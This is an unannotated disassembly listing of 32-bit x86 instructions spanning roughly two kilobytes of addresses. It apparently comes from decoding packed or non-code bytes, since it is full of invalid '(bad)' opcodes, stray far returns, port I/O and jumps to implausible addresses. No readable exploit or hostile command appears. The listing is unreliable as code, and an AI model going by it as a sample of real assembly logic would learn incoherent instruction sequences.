  4129e9:	mov    ah,ch
  4129eb:	add    DWORD PTR [ebp+0x4534f845],eax
  4129f1:	sub    al,0x86
  4129f3:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4129fa:	mov    ch,0xff
  4129fc:	clc    
  4129fd:	add    DWORD PTR [ebp+0x60],0x3d
  412a01:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  412a08:	inc    ebp
  412a09:	dec    DWORD PTR [ebx-0x341ff701]
  412a0f:	test   esi,ecx
  412a11:	dec    DWORD PTR [ebx-0x7f8a3301]
  412a17:	push   eax
  412a18:	add    DWORD PTR [ebp+0x0],eax
  412a1b:	dec    ebx
  412a1d:	or     al,0xce
  412a1f:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  412a26:	into   
  412a27:	add    BYTE PTR [ebx-0x34ff1400],cl
  412a2d:	mov    esi,ecx
  412a2f:	sar    bh,0x45
  412a32:	adc    al,0x8b
  412a34:	clc    
  412a35:	fadd   DWORD PTR [ebp+0x0]
  412a38:	mov    ebp,DWORD PTR [edx+0x8]
  412a3b:	push   edi
  412a3c:	adc    BYTE PTR [eax+0x1],0x83
  412a40:	add    al,al
  412a42:	retf   
  412a43:	mov    ecx,esi
  412a45:	cld    
  412a46:	mov    eax,DWORD PTR [eax+0xcb01cc]
  412a4c:	into   
  412a4d:	add    BYTE PTR [ebx+0x756aec00],cl
  412a53:	jne    0x412a88
  412a55:	inc    DWORD PTR [ebx]
  412a57:	rcl    BYTE PTR [ecx+0x50],1
  412a5a:	push   eax
  412a5b:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  412a61:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  412a68:	sar    bh,0x84
  412a6b:	or     BYTE PTR [ebx],al
  412a6d:	push   eax
  412a6e:	add    BYTE PTR [ebx+0x4532c845],cl
  412a74:	pushf  
  412a75:	xor    edi,eax
  412a77:	pushf  
  412a78:	mov    ah,0x89
  412a7a:	test   eax,ebp
  412a7c:	clc    
  412a7d:	inc    ebp
  412a7e:	inc    ebp
  412a7f:	mov    DWORD PTR [eax+eax*8],esi
  412a82:	sub    al,0x30
  412a84:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  412a8b:	dec    ebp
  412a8c:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a90:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  412a96:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a9a:	or     DWORD PTR [ecx+0x45ff085c],0x0
  412aa1:	shl    DWORD PTR [ebp-0x380064],1
  412aa7:	int3   
  412aa8:	lea    eax,[ebp+0x45fff860]
  412aae:	push   eax
  412aaf:	xor    dh,BYTE PTR [ebp-0x64]
  412ab2:	(bad)  
  412ab3:	(bad)  
  412ab4:	pop    esp
  412ab5:	lods   al,BYTE PTR ds:[esi]
  412ab6:	inc    DWORD PTR [ebp+0x4508f8ff]
  412abc:	mov    edi,DWORD PTR [eax+edx*8]
  412abf:	pushf  
  412ac0:	jo     0x412a89
  412ac2:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  412ac9:	inc    ebp
  412aca:	add    BYTE PTR [esi],bh
  412acc:	push   0x8b809c
  412ad1:	in     al,dx
  412ad2:	inc    ebp
  412ad3:	push   ebp
  412ad4:	mov    esi,DWORD PTR [ebx]
  412ad6:	cld    
  412ad7:	add    eax,DWORD PTR [eax+0xf013b]
  412add:	adc    al,0x0
  412adf:	add    bh,bh
  412ae1:	jmp    0xbe2bfe
  412ae6:	add    BYTE PTR [ebp+0x45],cl
  412ae9:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  412aef:	dec    ebp
  412af0:	push   0x38033
  412af5:	cmp    eax,DWORD PTR [eax]
  412af7:	unpcklps xmm7,xmm0
  412afa:	jne    0x412afc
  412afc:	dec    DWORD PTR [ebx+0x5545cc18]
  412b02:	mov    DWORD PTR [ebx],esi
  412b04:	shl    BYTE PTR [ebx],1
  412b06:	inc    ebp
  412b07:	add    ecx,DWORD PTR [ecx+0x60fc803]
  412b0d:	retf   0x5575
  412b10:	dec    DWORD PTR [ebx-0x5ba17e8]
  412b16:	(bad)  
  412b17:	stc    
  412b18:	in     al,dx
  412b19:	or     al,0x85
  412b1b:	dec    ebp
  412b1c:	clc    
  412b1d:	xor    eax,DWORD PTR [ebp+0x3]
  412b20:	mov    ebp,ecx
  412b22:	rol    BYTE PTR [eax],1
  412b24:	inc    ebp
  412b25:	add    BYTE PTR [eax-0x7747ab3],bh
  412b2b:	clc    
  412b2c:	inc    ebp
  412b2d:	retf   
  412b2e:	mov    edx,ebx
  412b30:	in     al,dx
  412b31:	(bad)  
  412b32:	retf   
  412b33:	into   
  412b34:	into   
  412b35:	scas   eax,DWORD PTR es:[edi]
  412b36:	dec    ebp
  412b37:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  412b3d:	sub    ecx,esi
  412b3f:	cmp    ecx,DWORD PTR [ebp+0x77]
  412b42:	(bad)  
  412b43:	mov    edi,eax
  412b45:	int3   
  412b46:	test   DWORD PTR [ecx-0x74baff08],ecx
  412b4c:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  412b53:	xor    eax,DWORD PTR [ebp+0x4503f803]
  412b59:	(bad)  
  412b5b:	retf   0x559c
  412b5e:	(bad)  
  412b5f:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  412b66:	inc    ebp
  412b67:	add    eax,0xeb9c4d3f
  412b6c:	(bad)  
  412b6d:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  412b73:	xor    ecx,DWORD PTR [ebp+0x33]
  412b76:	mov    eax,DWORD PTR [ebx]
  412b78:	call   0xce50f680
  412b7d:	retf   0x55d1
  412b80:	test   BYTE PTR [ebx-0x5ff17fe],cl
  412b86:	jmp    0x412b81
  412b88:	add    BYTE PTR ds:0xebf44d8b,al
  412b8e:	push   ebp
  412b8f:	mov    ebp,DWORD PTR [ebx]
  412b91:	mov    eax,0x33f8558b
  412b96:	retf   
  412b97:	xor    ecx,esi
  412b99:	add    edx,ecx
  412b9b:	add    eax,DWORD PTR [edx+0xca010f]
  412ba1:	push   ebp
  412ba2:	dec    ebp
  412ba3:	mov    ecx,DWORD PTR [ebx-0x34050718]
  412ba9:	stc    
  412baa:	rol    DWORD PTR ds:0xebce4dd6,cl
  412bb0:	scas   eax,DWORD PTR es:[edi]
  412bb1:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  412bb7:	xor    ebp,DWORD PTR [ebx]
  412bb9:	xor    edi,DWORD PTR [ebx]
  412bbb:	add    esi,DWORD PTR [edi+0x3]
  412bbe:	mov    ecx,DWORD PTR [edi]
  412bc0:	clc    
  412bc1:	retf   0x55cb
  412bc4:	into   
  412bc5:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  412bcc:	test   al,0x4d
  412bce:	push   ebp
  412bcf:	jbe    0x412c04
  412bd1:	mov    esi,DWORD PTR [ebx]
  412bd3:	mov    al,0x3
  412bd5:	push   ebp
  412bd6:	add    esi,DWORD PTR [ebx]
  412bd8:	rdpmc  
  412bda:	retf   0x5503
  412bdd:	add    ecx,DWORD PTR [ebx-0x53517f1]
  412be3:	dec    ebp
  412be4:	stc    
  412be5:	mov    ecx,DWORD PTR [eax]
  412be7:	or     BYTE PTR [ebp+0x4d],cl
  412bea:	jmp    0x1352c7a
  412bef:	dec    ebp
  412bf0:	dec    ebp
  412bf1:	(bad)  
  412bf2:	mov    ebx,esp
  412bf4:	clc    
  412bf5:	test   ebx,ecx
  412bf7:	clc    
  412bf8:	ror    DWORD PTR [ebp-0x2a],cl
  412bfb:	mov    esi,ecx
  412bfd:	lock scas eax,DWORD PTR es:[edi]
  412bff:	inc    ebp
  412c00:	mov    esi,DWORD PTR [ebx]
  412c02:	hlt    
  412c03:	pushf  
  412c04:	jge    0x412b91
  412c06:	sub    ebx,esp
  412c08:	cmp    ecx,ebx
  412c0a:	ja     0x412bda
  412c0c:	mov    ebp,DWORD PTR [eax-0x58]
  412c0f:	dec    ebp
  412c10:	xor    ecx,DWORD PTR [di+0x3]
  412c14:	mov    esp,esp
  412c16:	clc    
  412c17:	push   ebp
  412c18:	retf   
  412c19:	mov    dl,bl
  412c1b:	adc    esi,edx
  412c1d:	jb     0x412bed
  412c1f:	add    BYTE PTR [edi-0xb7474b3],ch
  412c25:	lock jge 0x412bf3
  412c28:	sub    ecx,DWORD PTR [ebp+0x3b]
  412c2b:	mov    esi,DWORD PTR [edi-0x20]
  412c2e:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  412c35:	mov    BYTE PTR [ebx-0x34b20729],cl
  412c3b:	mov    edx,ebx
  412c3d:	lock (bad) 
  412c3f:	ror    esi,cl
  412c41:	push   ebp
  412c42:	scas   eax,DWORD PTR es:[edi]
  412c43:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  412c49:	pushf  
  412c4a:	sub    esi,DWORD PTR [edx]
  412c4c:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  412c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c53:	xor    esp,DWORD PTR [ebx]
  412c55:	add    ecx,DWORD PTR [ebp-0x1c]
  412c58:	mov    edi,DWORD PTR [ebp-0x8]
  412c5b:	mov    bl,cl
  412c5d:	cmp    dl,bl
  412c5f:	jb     0x412c2f
  412c61:	add    dh,dl
  412c63:	dec    ebp
  412c64:	scas   eax,DWORD PTR es:[edi]
  412c65:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  412c6b:	shr    DWORD PTR [ebx],cl
  412c6d:	into   
  412c6e:	cmp    edx,esi
  412c70:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  412c76:	dec    ebp
  412c77:	dec    ebp
  412c78:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  412c7e:	retf   
  412c7f:	xor    edx,esi
  412c81:	add    ecx,esi
  412c83:	imul   ecx,edx
  412c86:	mov    DWORD PTR [ebp+0x8],edx
  412c89:	xor    ecx,DWORD PTR [ebp+0x2b]
  412c8c:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  412c92:	add    esi,DWORD PTR [ebx]
  412c94:	rol    BYTE PTR [ebx],0x45
  412c97:	rdtsc  
  412c99:	xlat   BYTE PTR ds:[ebx]
  412c9a:	pushf  
  412c9b:	jge    0x412c26
  412c9d:	xor    esp,eax
  412c9f:	sub    eax,DWORD PTR [ebp-0x73]
  412ca2:	(bad)  
  412ca3:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  412caa:	dec    ebp
  412cab:	xchg   BYTE PTR [ebx],dh
  412cad:	inc    DWORD PTR [ebx]
  412caf:	(bad)  
  412cb0:	jmp    0x412cff
  412cb2:	mov    ecx,DWORD PTR [ebx-0x34341324]
  412cb8:	dec    ebp
  412cb9:	into   
  412cba:	mov    ebp,DWORD PTR [edi-0x23737420]
  412cc0:	pushf  
  412cc1:	shl    DWORD PTR [edx],cl
  412cc3:	retf   0x5588
  412cc6:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412ccc:	add    eax,DWORD PTR [eax]
  412cce:	in     al,0x4d
  412cd0:	push   ebp
  412cd1:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  412cd7:	fs add ch,cl
  412cda:	dec    ebp
  412cdb:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  412ce1:	dec    ebp
  412ce2:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  412ce8:	jge    0x412cb8
  412cea:	mov    BYTE PTR [edi+0xf723b3a],ch
  412cf0:	add    cl,dh
  412cf2:	dec    ebp
  412cf3:	dec    DWORD PTR [ebx-0x2c032301]
  412cf9:	inc    ebp
  412cfa:	push   ebp
  412cfb:	dec    DWORD PTR [ebx-0x73ff1f34]
  412d01:	lea    ebx,[esp+edx*2+0x508bff32]
  412d08:	mov    ah,0x45
  412d0a:	push   ebp
  412d0b:	mov    esi,DWORD PTR [ebx]
  412d0d:	les    esi,FWORD PTR [ebx]
  412d0f:	add    BYTE PTR [ebx],al
  412d11:	inc    DWORD PTR [ebx]
  412d13:	mov    ecx,DWORD PTR [edi]
  412d15:	cld    
  412d16:	retf   0x4d80
  412d19:	add    DWORD PTR [ecx+0x4d30e400],ecx
  412d1f:	jne    0x412cac
  412d21:	(bad)  
  412d22:	in     al,dx
  412d23:	ror    bl,1
  412d25:	scas   al,BYTE PTR es:[edi]
  412d26:	into   
  412d27:	add    BYTE PTR [edi-0xf2f7475],ch
  412d2d:	not    bl
  412d2f:	adc    al,0xca
  412d31:	inc    ebp
  412d32:	push   ebp
  412d33:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  412d39:	push   0xaf80d6
  412d3e:	mov    eax,DWORD PTR [eax]
  412d40:	fdiv   st(7),st
  412d42:	sti    
  412d43:	sbb    dh,cl
  412d45:	pop    esi
  412d46:	xchg   esp,eax
  412d47:	leave  
  412d48:	pushf  
  412d49:	add    al,0x32
  412d4b:	push   ebp
  412d4c:	cmp    ebp,esp
  412d4e:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  412d52:	dec    DWORD PTR [ecx-0x740f0375]
  412d58:	push   ebp
  412d59:	cld    
  412d5a:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  412d60:	retf   0x558b
  412d63:	clc    
  412d64:	xor    esi,eax
  412d66:	add    esi,DWORD PTR [ebp-0x75]
  412d69:	(bad)  
  412d6a:	hlt    
  412d6b:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  412d72:	mov    DWORD PTR [edx],ecx
  412d74:	hlt    
  412d75:	(bad)  
  412d76:	dec    ebp
  412d77:	add    dh,BYTE PTR [ebx]
  412d79:	leave  
  412d7a:	mov    edx,0xffec8d55
  412d7f:	push   ecx
  412d80:	rol    DWORD PTR [ebp+0x55],1
  412d83:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  412d89:	mov    eax,0xf8030b33
  412d8e:	lar    ecx,di
  412d91:	push   ebp
  412d92:	retf   0x863b
  412d95:	jne    0x412d94
  412d97:	mov    edi,edi
  412d99:	or     BYTE PTR [ebp+0x41],dh
  412d9c:	mov    ebp,esp
  412d9e:	cld    
  412d9f:	inc    eax
  412da0:	mov    al,0x25
  412da2:	add    DWORD PTR [ecx+0x0],eax
  412da5:	in     eax,dx
  412da6:	test   DWORD PTR [ecx-0x1],eax
  412da9:	fdiv   st(7),st
  412dab:	ret    0x8b
  412dae:	cld    
  412daf:	mov    eax,DWORD PTR [eax+0x8d0151]
  412db5:	clc    
  412db6:	xor    BYTE PTR [ebp+0x45],al
  412db9:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  412dbf:	loopne 0x412dc0
  412dc1:	mov    edi,edi
  412dc3:	mov    ecx,eax
  412dc5:	clc    
  412dc6:	jne    0x412d98
  412dc8:	call   0x823ed1
  412dcd:	and    eax,0xc6854575
  412dd2:	je     0x412dd5
  412dd4:	mov    eax,esi
  412dd6:	cld    
  412dd7:	or     DWORD PTR [eax+0x401c9],eax
  412ddd:	push   ebp
  412dde:	add    ah,ch
  412de0:	add    BYTE PTR [ecx+0x6a],dl
  412de3:	inc    ebp
  412de4:	push   esi
  412de5:	mov    DWORD PTR [eax-0x4],edx
  412de8:	pop    edi
  412de9:	mov    ebx,DWORD PTR [ebx-0x4]
  412dec:	ret    0xbe
  412def:	push   es
  412df0:	mov    ecx,DWORD PTR [ecx-0x77274af]
  412df6:	clc    
  412df7:	lock inc ebp
  412df9:	jne    0x412e51
  412dfb:	(bad)  
  412dfc:	jne    0x412e02
  412dfe:	mov    eax,0xf841ba66
  412e03:	fadd   QWORD PTR [esi]
  412e05:	(bad)  
  412e06:	jne    0x412e45
  412e08:	cmp    eax,ebx
  412e0a:	pop    esi
  412e0b:	mov    ecx,DWORD PTR [eax]
  412e0d:	push   ecx
  412e0e:	inc    ecx
  412e0f:	lea    esi,[eax-0x8]
  412e12:	inc    edx
  412e13:	inc    ebp
  412e14:	int    0x8b
  412e16:	inc    edx
  412e17:	cld    
  412e18:	jo     0x412dd9
  412e1a:	inc    ecx
  412e1b:	xchg   edx,esp
  412e1d:	mov    ebx,eax
  412e1f:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  412e25:	or     edi,eax
  412e27:	inc    ebp
  412e28:	inc    ebp
  412e29:	(bad)  
  412e2a:	mov    ecx,DWORD PTR [eax]
  412e2c:	cld    
  412e2d:	(bad)  
  412e2e:	jmp    0x412e31
  412e30:	mov    eax,esi
  412e32:	mov    DWORD PTR ds:0x4f8c98b,eax
  412e38:	rcl    BYTE PTR [esi+0xf],1
  412e3b:	iret   
  412e3c:	inc    ebp
  412e3d:	leave  
  412e3e:	(bad)  
  412e3f:	dec    DWORD PTR [ecx]
  412e41:	mov    eax,esi
  412e43:	mov    eax,DWORD PTR [edi]
  412e45:	mov    dh,0xdd
  412e48:	push   es
  412e49:	nop
  412e4a:	(bad)  
  412e4b:	inc    DWORD PTR [ebx]
  412e4d:	push   esi
  412e4e:	leave  
  412e4f:	iret   
  412e50:	add    al,0x46
  412e52:	push   ebp
  412e53:	jmp    0xff928444
  412e58:	inc    ebp
  412e59:	push   esi
  412e5a:	mov    DWORD PTR [esi-0x4],eax
  412e5d:	in     eax,dx
  412e5e:	push   ebp
  412e5f:	sbb    BYTE PTR [eax+0x7c6daff],bh
  412e65:	add    al,BYTE PTR [edx]
  412e67:	mov    edx,DWORD PTR [ebp-0x17]
  412e6a:	cmp    edi,esi
  412e6c:	jne    0x412e6d
  412e6e:	(bad)  
  412e6f:	push   esi
  412e70:	pop    es
  412e71:	push   ebp
  412e72:	mov    ebp,esp
  412e74:	or     BYTE PTR [ebp+0x41],al
  412e77:	add    edi,esp
  412e79:	sub    BYTE PTR [eax-0x4],al
  412e7c:	int3   
  412e7d:	jne    0x412e41
  412e7f:	add    DWORD PTR [eax],eax
  412e81:	sbb    al,0x8b
  412e83:	mov    edx,DWORD PTR [ecx+0x14]
  412e86:	lea    edx,[edx-0x1ba7508]
  412e8c:	push   esi
  412e8d:	enter  0xd375,0xb8
  412e91:	test   DWORD PTR [esi],0x6ce0750
  412e97:	enter  0xd375,0x3b
  412e9b:	neg    DWORD PTR [esi+0x50]
  412e9e:	or     cl,dl
  412ea0:	inc    edx
  412ea1:	(bad)  
  412ea2:	loope  0x412e90
  412ea4:	(bad)  
  412ea5:	sub    eax,DWORD PTR [ebx]
  412ea7:	inc    eax
  412ea8:	loope  0x412efa
  412eaa:	add    dl,BYTE PTR [eax-0x37]
  412ead:	push   edi
  412eae:	push   ebp
  412eaf:	imul   ah
  412eb1:	adc    DWORD PTR [ecx-0x1],0x45
  412eb5:	add    BYTE PTR [ecx+0x55d3fc00],cl
  412ebb:	lea    edi,[eax-0x7fff4ca]
  412ec1:	mov    eax,0x4550402
  412ec6:	cmp    ebp,ecx
  412ec8:	jne    0x412e75
  412eca:	mov    eax,DWORD PTR ds:0x241e808
  412ed0:	in     eax,dx
  412ed1:	add    BYTE PTR [eax-0x7],al
  412ed4:	out    0x36,eax
  412ed6:	inc    ecx
  412ed7:	aas    
  412ed8:	jmp    0xccf15a
  412edd:	lock mov edi,DWORD PTR [ebp-0x18]
  412ee1:	and    edi,edi
  412ee3:	mov    edi,edi
  412ee5:	call   0xe40f2fc1
  412eea:	push   es
  412eeb:	add    al,ch
  412eed:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  412ef4:	(bad)  
  412ef5:	hlt    
  412ef6:	add    eax,0xffd3e87d
  412efb:	cmp    bh,0x8
  412efe:	(bad)  
  412eff:	fld    DWORD PTR [esi]
  412f01:	out    dx,al
  412f02:	call   0xffa02e0a
  412f07:	cmp    al,0x46
  412f09:	shl    edx,0x8
  412f0c:	(bad)  
  412f0d:	pop    es
  412f0e:	fisttp QWORD PTR [ebp+0xe577eff]
  412f14:	push   ebx
  412f15:	add    BYTE PTR [ebx+0x24008b56],cl
  412f1b:	add    BYTE PTR [ebp+0x50],al
  412f1e:	push   eax
  412f1f:	add    DWORD PTR [ebx+0x757d1834],ecx
  412f25:	sub    edx,DWORD PTR [esi-0x24]
  412f28:	jne    0x412ee0
  412f2a:	lods   eax,DWORD PTR ds:[esi]
  412f2b:	mov    edx,DWORD PTR [edx-0x34]
  412f2e:	dec    esi
  412f2f:	out    0x83,eax
  412f31:	into   
  412f32:	push   edi
  412f34:	loopne 0x412f04
  412f36:	shr    BYTE PTR [edx+ecx*4+0x0],1
  412f3a:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  412f41:	rol    DWORD PTR [edx],0x8
  412f44:	mov    esp,ecx
  412f46:	cmp    DWORD PTR [ebx],0xc
  412f49:	mov    esi,0x5001c0
  412f4e:	push   eax
  412f4f:	push   cs
  412f50:	push   eax
  412f51:	(bad)  
  412f52:	sub    edx,edi
  412f54:	push   esi
  412f55:	adc    al,0xcb
  412f57:	ins    DWORD PTR es:[edi],dx
  412f58:	mov    eax,0x203e8
  412f5d:	add    al,ah
  412f5f:	inc    esi
  412f60:	mov    al,ch
  412f62:	pop    es
  412f63:	add    DWORD PTR [eax],0x1
  412f66:	add    dh,al
  412f68:	add    ah,ch
  412f6a:	rol    DWORD PTR [edx-0xd],1
  412f6d:	cli    
  412f6e:	push   0x4a
  412f70:	pop    ecx
  412f71:	retf   0xfe6
  412f74:	add    BYTE PTR [ebx-0x4e72f41e],al
  412f7a:	(bad)  
  412f7b:	dec    BYTE PTR [ebx+0x45b1fc72]
  412f81:	(bad)  
  412f82:	sub    ebp,DWORD PTR [ebx]
  412f84:	and    al,0x52
  412f86:	(bad)  
  412f87:	dec    edi
  412f88:	inc    ebp
  412f89:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  412f90:	add    BYTE PTR [ebp-0x7b],dh
  412f93:	pop    eax
  412f94:	add    BYTE PTR [edx+0x0],bl
  412f97:	pop    edx
  412f98:	dec    ebp
  412f99:	jmp    DWORD PTR [ebx]
  412f9b:	and    al,0xec
  412f9d:	push   edx
  412f9e:	out    0x64,eax
  412fa0:	jmp    0xd3f325a5
  412fa5:	jmp    0x412fff
  412fa7:	mov    al,0xfe
  412fa9:	dec    BYTE PTR [ebp-0x18fd8018]
  412faf:	add    BYTE PTR [esi+ebp*1],bh
  412fb2:	pop    edx
  412fb3:	icebp  
  412fb4:	mov    eax,cs
  412fb6:	ins    BYTE PTR es:[edi],dx
  412fb7:	adc    eax,0x75510000
  412fbc:	mov    esi,0x70158
  412fc1:	or     DWORD PTR [eax-0x74f48dfe],esi
  412fc7:	mov    edi,esp
  412fc9:	cld    
  412fca:	jge    0x413041
  412fcc:	(bad)  
  412fce:	aas    
  412fcf:	and    al,0x6d
  412fd1:	adc    cl,0x1
  412fd4:	mov    eax,DWORD PTR [eax]
  412fd6:	and    ecx,DWORD PTR [ebx-0x167203fd]
  412fdc:	dec    ebp
  412fdd:	add    eax,ebp
  412fdf:	add    BYTE PTR [edx],al
  412fe1:	fadd   DWORD PTR [eax]
  412fe3:	stc    
  412fe4:	enter  0xee00,0x8b
  412fe8:	sbb    eax,0x1
  412feb:	sbb    esi,ecx
  412fed:	in     al,0x0
  412fef:	in     eax,dx
  412ff0:	add    BYTE PTR [eax],al
  412ff2:	jne    0x412f7f
  412ff4:	cmp    edx,esp
  412ff6:	jb     0x413001
  412ff8:	jmp    0x41306f
  412ffa:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  413000:	add    BYTE PTR [ebx+0x4d83d840],cl
  413006:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  41300c:	jb     0x412f97
  41300e:	pop    edx
  41300f:	fadd   QWORD PTR [ebx-0x7445faa1]
  413015:	or     dh,BYTE PTR [edx+0x0]
  413018:	inc    edx
  413019:	or     dl,bh
  41301b:	xlat   BYTE PTR ds:[ebx]
  41301c:	dec    edx
  41301d:	push   edi
  41301e:	add    al,0x7
  413020:	leave  
  413021:	rol    DWORD PTR [edx+eax*1],0x7
  413025:	add    ecx,ecx
  413027:	mov    edx,ecx
  413029:	int3   
  41302a:	jmp    0x412fea
  41302c:	mov    al,0x0
  41302e:	(bad)  
  41302f:	jne    0x413019
  413031:	mov    eax,DWORD PTR [edx]
  413033:	call   0xc155ad38
  413038:	pop    edi
  413039:	add    ebx,DWORD PTR [ecx-0x37]
  41303c:	pop    ecx
  41303d:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  413044:	push   es
  413045:	mov    eax,DWORD PTR [eax]
  413047:	int3   
  413048:	add    ch,al
  41304a:	jae    0x413034
  41304c:	int    0x1
  41304e:	enter  0x3000,0x18
  413052:	add    BYTE PTR [ebp+0x75],al
  413055:	mov    esi,DWORD PTR [eax-0x171f0134]
  41305b:	push   0x2
  41305d:	pop    ecx
  41305e:	add    BYTE PTR [eax],cl
  413060:	push   ebx
  413061:	lea    edi,[edi+eax*2]
  413064:	mov    al,0x1
  413066:	jb     0x413068
  413068:	mov    al,0x10
  41306a:	push   eax
  41306b:	add    al,0x75
  41306d:	add    BYTE PTR [ebx],ch
  41306f:	add    ebx,esp
  413071:	int3   
  413072:	jne    0x413084
  413074:	movsx  edx,cl
  413077:	add    DWORD PTR [eax],eax
  413079:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  413080:	mov    gs,edi
  413082:	add    BYTE PTR [eax-0x50],ch
  413085:	add    al,ch
  413087:	mov    eax,DWORD PTR [ecx]
  413089:	sub    eax,DWORD PTR [eax]
  41308b:	jb     0x413102
  41308d:	add    DWORD PTR [esp+eiz*8-0x50],esi
  413091:	jge    0x41307b
  413093:	add    al,0x1
  413095:	add    DWORD PTR [eax],0x0
  413098:	jne    0x41309a
  41309a:	je     0x4130e1
  41309c:	mov    eax,DWORD PTR [edi]
  41309e:	ror    BYTE PTR [ebp+0x4d],1
  4130a1:	or     DWORD PTR [ecx+0x4d03d004],0x3
  4130a8:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  4130ae:	mov    DWORD PTR [ebx],ebp
  4130b0:	fadd   DWORD PTR [eax+0x75]
  4130b3:	inc    eax
  4130b4:	pop    eax
  4130b5:	lea    ebx,[ecx+0x4f]
  4130b8:	push   0xb1000003
  4130bd:	out    dx,eax
  4130be:	add    ebp,DWORD PTR [edx+edx*2]
  4130c1:	add    BYTE PTR [ebx+ecx*4],bh
  4130c4:	mov    ch,BYTE PTR [ebx]
  4130c6:	jb     0x41313a
  4130c8:	add    al,0x89
  4130ca:	push   eax
  4130cb:	call   0x84297e3d
  4130d0:	add    DWORD PTR [eax+eax*1],eax
  4130d3:	jae    0x4130e9
  4130d5:	icebp  
  4130d6:	inc    ebp
  4130d7:	mov    eax,DWORD PTR gs:[ecx]
  4130da:	int3   
  4130db:	out    dx,al
  4130dc:	loopne 0x41312b
  4130de:	sub    eax,DWORD PTR [edx]
  4130e0:	push   0xffffff83
  4130e2:	pop    esi
  4130e3:	push   cs
  4130e4:	jl     0x4130ff
  4130e6:	add    al,0xaf
  4130e8:	xor    eax,0x832b6d00
  4130ed:	mov    eax,DWORD PTR [edx]
  4130ef:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4130f5:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4130fb:	inc    ebp
  4130fc:	shr    ebx,0x3
  4130ff:	or     DWORD PTR [eax],0x4
  413102:	push   0xffffffa5
  413104:	pop    esi
  413105:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  41310c:	jmp    0x41316b
  41310e:	mov    edi,0xff0272
  413113:	fdivr  QWORD PTR [ebp+0x5d]
  413116:	push   0x4e
  413118:	pop    ecx
  413119:	call   0x41751e
  41311e:	mov    DWORD PTR [ebx],eax
  413120:	in     al,0xc8
  413122:	rol    BYTE PTR [ebp-0x75],0xc1
  413126:	call   0xab3307
  41312b:	pop    esi
  41312c:	enter  0xceff,0x8b
  413130:	repz mov ecx,DWORD PTR [ebp-0x34]
  413134:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  41313b:	je     0x41313d
  41313d:	or     DWORD PTR [ebx-0x74183b24],eax
  413143:	jne    0x413129
  413145:	jmp    0x413140
  413147:	push   DWORD PTR [edx-0x24]
  41314a:	push   0x4d
  41314c:	pop    ecx
  41314d:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  413151:	jge    0x413159
  413153:	mov    eax,eax
  413155:	sub    ebp,DWORD PTR [edx+0x24]
  413158:	pop    esi
  413159:	inc    ebp
  41315a:	mov    esp,0x8b6077
  41315f:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  413165:	lods   al,BYTE PTR ds:[esi]
  413166:	add    BYTE PTR [ebx],bh
  413168:	enter  0xce73,0x49
  41316c:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  413174:	stc    
  413175:	jge    0x4131e9
  413177:	jnp    0xdd40b4d8
  41317d:	call   0xc43253
  413182:	fadd   st(0),st
  413184:	dec    esi
  413185:	ins    BYTE PTR es:[edi],dx
  413186:	stc    
  413187:	cmp    al,0x73
  413189:	push   ebp
  41318a:	mov    eax,0xf8028b
  41318f:	jne    0x413152
  413191:	mov    esi,ecx
  413193:	mov    esp,DWORD PTR [ebp+0x2c]
  413196:	add    edi,DWORD PTR [ebp-0x24]
  413199:	sub    esp,eax
  41319b:	and    al,0x45
  41319d:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4131a3:	sbb    al,0xee
  4131a5:	pop    esi
  4131a6:	call   0x8131d6
  4131ab:	fsubr  st,st(3)
  4131ad:	sti    
  4131ae:	add    BYTE PTR gs:[ecx],bh
  4131b1:	add    eax,esp
  4131b3:	add    DWORD PTR [esi],eax
  4131b5:	rol    DWORD PTR [ebp+0x8],0x29
  4131b9:	mov    esp,eax
  4131bb:	clc    
